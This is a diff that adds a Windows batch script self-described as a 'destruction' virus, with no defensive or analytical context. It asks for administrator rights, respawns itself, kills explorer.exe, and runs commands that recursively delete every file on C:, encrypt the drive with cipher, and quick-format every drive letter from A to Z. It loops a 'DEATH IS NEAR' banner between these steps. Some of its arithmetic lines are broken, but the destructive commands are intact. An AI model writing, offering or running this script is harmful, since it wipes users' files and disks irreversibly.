@@ -1,0 +1,51 @@
+@echo off
+title Ultimate Destruction and Fun Virus Script
+
+:adminCheck
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    goto main
+) else (
+    echo Elevating to admin...
+    powershell Start-Process -FilePath "%0" -Verb runAs
+    exit
+)
+
+:main
+echo Ultimate destruction and fun virus activated!
+
+:reopen
+echo Restarting script...
+start "" "%0"
+timeout /t 3 >nul
+taskkill /f /im explorer.exe >nul 2>&1
+goto destroy
+
+:funVirus
+setlocal enabledelayedexpansion
+set /a "width=%%~nx0%%~nx1"
+set /a "height=%%~ny0%%~ny1"
+set /a "posX=!random! %% (width - 50)"
+set /a "posY=!random! %% (height - 10)"
+mode con: cols=120 lines=40
+color 0a
+echo.
+echo    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+echo    *                      DEATH IS NEAR DEAT IS NEAR DEAT IS NEAR                        *
+echo    ***************************************************************************************
+
+goto reopen
+
+
+:destroy
+echo Initiating complete destruction...
+echo Deleting all files and folders...
+del /f /s /q C:\*.* >nul 2>&1
+echo Encrypting all files...
+cipher /e /s:C:\ >nul 2>&1
+echo Deleting all drives...
+for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    echo Deleting %%d:\
+    format %%d: /q /y >nul 2>&1
+)
+goto funVirus
